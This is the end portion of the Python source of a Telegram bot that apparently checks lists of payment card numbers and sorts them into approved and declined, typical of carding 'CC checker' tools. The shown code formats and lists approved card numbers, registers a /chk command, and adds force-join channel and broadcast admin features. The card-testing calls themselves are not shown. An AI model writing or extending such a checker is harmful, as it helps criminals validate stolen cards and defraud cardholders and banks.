    results_text = (
        f"{emojify_text('✅')} <b>━━━━━━ RESULTS ━━━━━━</b> {emojify_text('✅')}\n\n"
        f"{emojify_text('📊')} <b>Total:</b> <code>{len(processing_cards)}</code>\n"
        f"{emojify_text('✅')} <b>Approved:</b> <code>{len(approved)}</code>\n"
        f"{emojify_text('❌')} <b>Declined:</b> <code>{len(declined)}</code>\n"
        f"{emojify_text('⚠️')} <b>Unknown:</b> <code>{len(unknown)}</code>\n"
        f"{emojify_text('🚫')} <b>Errors:</b> <code>{len(errors)}</code>\n\n"
    )
    
    if approved:
        results_text += f"{emojify_text('✅')} <b>APPROVED CARDS:</b>\n"
        for card, result in approved[:10]:
            results_text += f"• <code>{card}</code> - {result}\n"
        if len(approved) > 10:
            results_text += f"<i>...and {len(approved)-10} more</i>\n"
        results_text += "\n"
    
    if declined:
        results_text += f"{emojify_text('❌')} <b>DECLINED CARDS:</b>\n"
        for card, result in declined[:5]:
            results_text += f"• <code>{card}</code> - {result}\n"
        if len(declined) > 5:
            results_text += f"<i>...and {len(declined)-5} more</i>\n"
        results_text += "\n"
    
    keyboard = [
        [
            InlineKeyboardButton(f"{emojify_button('📊')} Check More", callback_data="check_cc"),
            InlineKeyboardButton(f"{emojify_button('📈')} Full Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton(f"{emojify_button('🔙')} Back to Menu", callback_data="back_to_menu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.edit_message_text(
            results_text,
            chat_id=current_chat_id,
            message_id=current_message_id,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error showing results: {e}")
        await context.bot.send_message(
            chat_id=current_chat_id,
            text=results_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    processing_cards = []
    processing_status = {}
    current_message_id = None
    current_chat_id = None

# ================ CANCEL ================
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        f"{emojify_text('❌')} <b>Operation cancelled!</b>\n"
        "Use /start to begin again.",
        parse_mode='HTML'
    )

# ================ ADMIN COMMANDS ================
async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /addchannel <channel_username_or_id>")
        return
    channel = args[0]
    channels = load_channels()
    if channel in channels:
        await update.message.reply_text(f"Channel {channel} already in list.")
        return
    channels.append(channel)
    save_channels(channels)
    await update.message.reply_text(f"✅ Added channel: {channel}")

async def remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /removechannel <channel_username_or_id>")
        return
    channel = args[0]
    channels = load_channels()
    if channel not in channels:
        await update.message.reply_text(f"Channel {channel} not in list.")
        return
    channels.remove(channel)
    save_channels(channels)
    await update.message.reply_text(f"❌ Removed channel: {channel}")

async def list_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized.")
        return
    channels = load_channels()
    if not channels:
        await update.message.reply_text("No channels in force join list.")
        return
    text = "📋 <b>Force Join Channels:</b>\n" + "\n".join([f"• {ch}" for ch in channels])
    await update.message.reply_text(text, parse_mode='HTML')

# ================ BROADCAST SYSTEM ================
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = " ".join(args)
    users = load_users()
    if not users:
        await update.message.reply_text("No users to broadcast.")
        return
    sent = 0
    failed = 0
    for uid in users:
        try:
            await context.bot.send_message(chat_id=uid, text=message, parse_mode='HTML')
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            failed += 1
    await update.message.reply_text(f"✅ Broadcast sent.\nSent: {sent}\nFailed: {failed}")

# ================ ERROR HANDLER ================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.warning(f"Update {update} caused error {context.error}")

# ================ MAIN ================
def main():
    """Start the bot with polling"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", start_check))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("reset", reset_stats))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("help", show_help))
    
    # Admin commands
    application.add_handler(CommandHandler("addchannel", add_channel))
    application.add_handler(CommandHandler("removechannel", remove_channel))
    application.add_handler(CommandHandler("listchannels", list_channels))
    application.add_handler(CommandHandler("broadcast", broadcast))
    
    # Callback query handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Message handler
    application.add_handler(MessageHandler(
        filters.TEXT | filters.Document.ALL, 
        handle_message
    ))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    # Start the bot with polling (NO webhook!)
    logger.info("🤖 Bot started with polling! Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
